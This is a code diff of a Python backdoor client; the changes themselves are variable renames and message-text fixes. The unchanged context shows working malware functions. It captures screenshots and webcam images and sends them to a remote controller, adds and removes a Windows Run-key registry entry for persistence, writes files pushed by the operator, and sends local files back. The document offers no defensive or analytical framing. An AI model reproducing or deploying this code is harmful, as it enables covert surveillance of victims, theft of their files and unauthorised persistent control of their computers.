@@ -37,10 +37,10 @@ while True:
             backdoor.send(byteOutput)
 
     elif first == "2":
-        ScreenShotImage = screenshot()
+        screenShotImage = screenshot()
 
         with BytesIO() as sc:
-            ScreenShotImage.save(sc, format="PNG")
+            screenShotImage.save(sc, format="PNG")
             imageSize = sc.getvalue()
             backdoor.send(imageSize)
 
@@ -62,7 +62,7 @@ while True:
                 backdoor.send(readedimage)
             executeOnSystem("del c1.png")
         except FileNotFoundError:
-            backdoor.send(b"camera is not used:.")
+            backdoor.send(b"camera is not found:.")
             
     elif first == "4":
         message = backdoor.recv(1024)
@@ -80,23 +80,23 @@ while True:
         startup = subprocess.Popen(f"REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /t REG_SZ /v {registeryName} /d {replacedStringDirectory}"
                                             ,stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                         stdin=subprocess.PIPE,shell=True)
-        WillSendReg = startup.stdout.read() + startup.stderr.read()
+        willSendReg = startup.stdout.read() + startup.stderr.read()
 
-        backdoor.send(WillSendReg)
+        backdoor.send(willSendReg)
     elif first == "6":
         removeStartup = subprocess.Popen(f"reg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ /v {registeryName} /f"
                                             ,stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                         stdin=subprocess.PIPE,shell=True)
-        WillRemoveReg = removeStartup.stdout.read() + removeStartup.stderr.read()
+        willRemoveReg = removeStartup.stdout.read() + removeStartup.stderr.read()
 
-        backdoor.send(WillRemoveReg)
+        backdoor.send(willRemoveReg)
 
     elif first == "7":
-        Extension = backdoor.recv(1024*1024).decode()#[0][1]
+        extension = backdoor.recv(1024*1024).decode()#[0][1]
         
         byteFile = backdoor.recv(1024*4096)#[1][1]
         
-        with open("byteFile."+Extension,"wb") as byte:
+        with open("byteFile."+extension,"wb") as byte:
             byte.write(byteFile)
             byte.close()
 
@@ -105,6 +105,6 @@ while True:
 
         with open(getFilePath,"rb") as getFile:
             readedGetFile = getFile.read()
-            getFile.close()
+        getFile.close()
 
         backdoor.send(readedGetFile)
